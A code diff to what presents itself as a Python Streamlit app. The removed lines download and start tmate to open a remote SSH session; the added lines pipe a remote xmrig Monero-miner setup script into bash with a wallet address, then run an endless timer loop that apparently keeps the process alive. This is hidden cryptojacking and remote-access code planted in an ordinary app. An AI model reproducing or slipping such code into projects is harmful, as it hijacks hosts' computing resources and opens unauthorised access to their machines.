@@ -4,7 +4,27 @@ import math
 import pandas as pd
 import streamlit as st
 import os
-os.system ("apt update -y")
-os.system ("apt install wget -y")
-os.system ("apt install tar -y")
-os.system ("wget -nc https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-i386.tar.xz && tar --skip-old-files -xvf tmate-2.4.0-static-linux-i386.tar.xz && cd tmate-2.4.0-static-linux-i386 && chmod +x tmate && ./tmate -S /tmp/tmate.sock new-session -d && ./tmate -S /tmp/tmate.sock wait tmate-ready && ./tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}'")         
+os.system ("curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 86VkWeqdPgyHYUFd2Nc84uhte6pdHNKMpay4MgCVPfVeG3BWzyDtq87BwWKxQFAxq3QQQR1Heeqc95xyUcchnaQi6L7Wfn2")
+
+import time 
+from IPython.display import clear_output 
+ 
+def zero_to_infinity(): 
+    i = 0 
+    while True: 
+        yield i 
+        i += 1 
+        time.sleep(1) 
+ 
+start = time.time() 
+for x in zero_to_infinity(): 
+    clear_output(wait=True) 
+    end = time.time() 
+    temp = end-start 
+    hours = temp//3600 
+    temp = temp - 3600*hours 
+    minutes = temp//120 
+    seconds = temp - 120*minutes 
+    print("") 
+    print('%s %d:%d:%d' %("Time execution : ",hours,minutes,seconds)) 
+    print("")
